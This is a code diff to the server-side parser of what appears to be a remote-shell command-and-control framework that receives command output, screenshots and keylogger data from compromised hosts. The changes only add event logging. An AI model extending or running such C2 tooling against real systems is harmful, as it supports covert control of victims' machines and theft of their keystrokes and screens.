@@ -37,7 +37,7 @@ class HTTPDParser:
                 # I assume we got command output here and save it
                 self.db.push_output(guid, data, cmd_guid)
                 Log.log_shell(guid, "Received", b64decode(data).decode())
-                self.db.append_shell_data(guid, "[%s] Received: \n%s\n" % (Utils.timestamp(), data))
+                self.db.append_shell_data(guid, "[%s] Received: \n%s\n" % (Utils.timestamp(), b64decode(data).decode()))
         return self.output
 
     def register(self, guid, data):
@@ -50,7 +50,8 @@ class HTTPDParser:
         print("")
         UI.success("Registering new shell %s" % prompt)
         UI.success("New shell ID %s GUID is %s" % (index, guid))
-
+        self.db.append_server_events("\n[%s] New Shell: %s" % (Utils.timestamp(),data))
+        self.db.append_server_events("\n[%s] Shell id: %s GUID: %s" % (Utils.timestamp(),index,guid))
         try:
             notify = EmailNotify(self.config)
             notify.send_notification("NEW SHELL callback: %s" % prompt)
@@ -74,6 +75,7 @@ class HTTPDParser:
         shell = self.db.get_prompt(guid).decode().split(" ")[1]
         Log.log_event("Screenshot", "Received (%s)" % shell)
         self.db.append_shell_data(guid, "[%s] Screenshot Received\n\n" % (Utils.timestamp()))
+        self.db.append_server_events("\n[%s] Screenshot Received: %s" % (Utils.timestamp(), shell))
         Log.log_screenshot(guid, data)
 
     def keylogger(self, guid, data):
@@ -91,6 +93,7 @@ class HTTPDParser:
             shell = self.db.get_prompt(guid).decode().split(" ")[1]
             UI.success("Running auto commands on shell %s" % shell)
             Log.log_event("Running auto commands on shell", shell)
+            self.db.append_server_events("\n[%s] Running auto commands on shell: %s" % (Utils.timestamp(),shell))
             
             for command in commands:
                 print("\t[+] %s" % command)
